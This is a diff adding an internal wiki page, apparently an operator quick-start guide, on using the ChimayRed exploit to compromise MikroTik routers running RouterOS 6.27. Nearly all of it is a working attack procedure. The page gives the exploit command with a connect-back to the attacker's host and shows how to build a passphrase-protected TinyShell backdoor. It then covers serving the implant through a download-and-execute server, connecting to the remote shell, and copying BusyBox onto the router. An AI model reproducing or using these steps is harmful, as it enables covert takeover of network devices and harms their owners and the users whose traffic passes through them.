@@ -1,0 +1,63 @@
+
+                        Owner: User #14587667
+Chimay Red, TinyShell, and BusyBox Quick Start Guide
+ChimayRed (CR) is an exploit that is used against MikroTik (MT) routers runing RouterOS.  It is used to upload a payload such as HIVE or TinyShell onto the MT router.  This guide explains how to utilize ChimayRed to upload the TinyShell payload to the MikroTik router.
+This guide makes the following assumptions:
+
+An Ubuntu Desktop 12.04 x64 workstation is used to run CR.  This will be referred to as your "ICON VM" in this guide.
+ChimayRed version 3.7
+TshPatcher version 1.0.4 (TinyShell)
+Python version 2.7.X
+ChimayRed is being thrown on the WANWide Area Network side of the MikroTik (NATNetwork Address Translation has been configured on the MT and ports 8291 and 80 are open on the WANWide Area Network side).
+Using a MikroTik RB 493G with RouterOS 6.27 installed.
+ICON IP Address: 172.20.12.23/24
+MikroTik WANWide Area Network IP Address: 172.20.100.6/30
+Directory containing ChimayRed: ~/Desktop/ChimayRed_v3.7
+Directory containing TshPatcher: ~/Desktop/TshPatcher_v1.0.4
+
+Directory containing BusyBox (MIPS-BE): ~/Desktop
+
+Step-by-step guide
+Run these steps from your ICON VM:
+
+Verify that the MikroTik is running RouterOS 6.X$ nc -nv 172.20.100.6 80GET / HTTP/1.0<press Enter twice>Look for "<h1>RouterOS v6.27</h1>"
+Verify python version 2.7 is installedpython --version
+Determine the ICON IP Addressifconfig
+Go to ChimayRed bin directory/home/ubuntu/Desktop/ChimayRed_v3.7/bin
+Exploit RB 493G using ChimayRed.python chimay_red.py -t 172.20.100.6:80 connectback -l 172.20.12.23 -p 4242
+The following output should be observed, which confirms successfully exploitation:[+] Connecting to: 172.20.100.6:80 [+] Detected RouterOS: 6.27[+] Detected architecture: mipsbe [+] 0 seconds until Web server is reset. [+] Web server reset. [+] Connecting to target... [+] Connected. [+] Sending exploit payload... [+] Exploit sent.
+
+Make TinyShell executable.cd /home/ubuntu/Desktop/TshPatcher_v1.0.4 chmod +x tshpatcher-1.0.4
+Build TinyShell with the following parameters:Passphrase: MyPassphraseListen Port: 12345Shell: /bin/ashPlatform: mt-mipsbe (MikroTik MIPS-BE)Output file: tshd-mipsbe./tshpatcher-1.0.4 -p 12345 -k MyPassphrase -m mt-mipsbe -o tshd-mipsbe -s /bin/ash
+The following output should be observed, which indicates that TinyShell was successfully built:Patching the following values:  . Passphrase -> MyPassphrase  . Listen Port -> 12345 . Shell -> /bin/ash  Generating executable for Linux/MIPS-BE (uClibc) ... ok  Generating tsh-x86_64 ... ok
+
+Upload TinyShell.First setup the download_and_exe server on ICON.cd ~/Desktop/ChimayRed_v3.7/binpython tools/download_and_exe_server.py -l  172.20.12.23 -p 4242 -f ~/Desktop/TshPatcher_v1.0.4/tshd-mipsbeCtrl-Zpython chimay_red.py -t 172.20.100.6:80 download_and_exe -l 172.20.12.23 -p 4242 -f /tmp/tshd-mipsbe<Press Enter>fgYou should observe the following output:[+] Got connection from 172.20.100.6:37874[+] Sending 42864 bytes...[+] Sent.
+
+
+Connect to MK TinyShell~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase                        
+Run the following commands to confirm that you have shell access.# cd /tmp# pwd/tmp# exit
+
+Copy BusyBox binary to MT~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase put ~/Desktop/busybox-mipsbe /tmp/
+Connect to MT~/Desktop/TshPatcher_v1.0.4/tsh-x86_64  172.20.100.6 12345 MyPassphrase
+Make BusyBox executablechmod +x /tmp/busybox-mipsbe
+
+ 
+You may also want to use visual panels to communicate related information, tips or things users need to be aware of.
+Related articles
+
+Related articles appear here based on the labels you select. Click to edit the macro and add or change labels.
+
+('contentbylabel' missing)
+('details' missing)
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+|
+                    
